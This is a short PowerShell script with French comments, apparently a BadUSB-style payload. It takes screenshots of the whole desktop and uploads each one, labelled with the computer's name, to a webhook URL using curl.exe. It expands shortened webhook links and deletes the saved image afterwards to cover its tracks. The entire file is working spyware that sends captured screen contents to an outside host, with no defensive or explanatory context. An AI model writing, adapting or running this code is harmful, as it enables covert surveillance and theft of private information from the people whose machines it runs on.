$hookurl = "$dc"
$seconds = 30 # Intervalle entre les captures d'écran en secondes 1
$a = 1 # Nombre de captures d'écran à prendre

# Détection de l'URL raccourcie
if ($hookurl.Length -ne 121) {
    Write-Host "URL du webhook raccourcie détectée.." 
    $hookurl = (irm $hookurl).url
}

# Fonction pour prendre une capture d'écran et l'envoyer avec le nom de l'ordinateur
Function TakeAndSendScreenshot {
    $Filett = "$env:temp\SC$([System.Guid]::NewGuid()).png" # Utilisation d'un GUID unique pour le nom de fichier
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    $computerName = $env:COMPUTERNAME
    $text = "Capture d'écran de $computerName"
    curl.exe -F "file1=@$filett" -F "text=$text" $hookurl
    Start-Sleep 1
    Remove-Item -Path $filett
}

# Boucle pour prendre et envoyer les captures d'écran
While ($a -gt 0) {
    TakeAndSendScreenshot
    Start-Sleep $seconds
    $a--
}
